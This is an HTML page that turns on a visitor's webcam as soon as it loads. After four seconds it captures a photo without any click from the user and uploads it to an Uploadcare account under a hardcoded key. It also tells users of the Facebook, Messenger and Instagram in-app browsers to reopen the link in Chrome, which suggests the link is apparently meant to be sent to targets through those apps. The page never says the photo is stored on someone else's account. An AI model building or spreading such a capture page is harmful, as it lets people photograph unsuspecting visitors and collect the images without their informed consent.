<!DOCTYPE html>
<html>
<head>
  <title>Auto Capture & Upload</title>
  <style>
    body {
      margin: 0;
      background: #000;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: sans-serif;
      color: white;
      text-align: center;
    }
    video {
      width: 100%;
      max-width: 400px;
      border-radius: 10px;
    }
    .warning {
      color: yellow;
      font-size: 14px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h2>Auto-Capturing...</h2>
  <video id="video" autoplay playsinline></video>
  <p class="warning" id="warn"></p>

  <script>
    const video = document.getElementById('video');
    const warn = document.getElementById('warn');

    // Check if browser is Facebook/Messenger/Instagram
    const ua = navigator.userAgent || '';
    if (ua.includes('FBAN') || ua.includes('FBAV') || ua.includes('Instagram')) {
      warn.textContent = "⚠️ Camera might not work in Messenger/Facebook browser. Please open this link in Google Chrome.";
    }

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        // Wait before capturing
        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0);

          // Stop camera stream
          stream.getTracks().forEach(track => track.stop());

          // Convert to blob
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('file', blob);
            formData.append('UPLOADCARE_STORE', '1');
            formData.append('UPLOADCARE_PUB_KEY', 'cc243a8b7d6b1f1c4162'); // your public key

            fetch('https://upload.uploadcare.com/base/', {
              method: 'POST',
              body: formData
            })
            .then(res => res.json())
            .then(data => {
              const url = `https://ucarecdn.com/${data.file}/`;
              document.body.innerHTML = `
                <h2>Image Uploaded ✅</h2>
                <p><a href="${url}" target="_blank">${url}</a></p>
                <img src="${url}" style="max-width: 100%; margin-top: 10px;" />
              `;
            })
            .catch(err => {
              alert("Upload failed ❌");
              console.error(err);
            });
          }, 'image/jpeg');
        }, 4000); // wait 4 seconds to allow camera to start
      })
      .catch(err => {
        alert("❌ Camera access denied or not supported.");
        console.error(err);
      });
  </script>
</body>
</html>
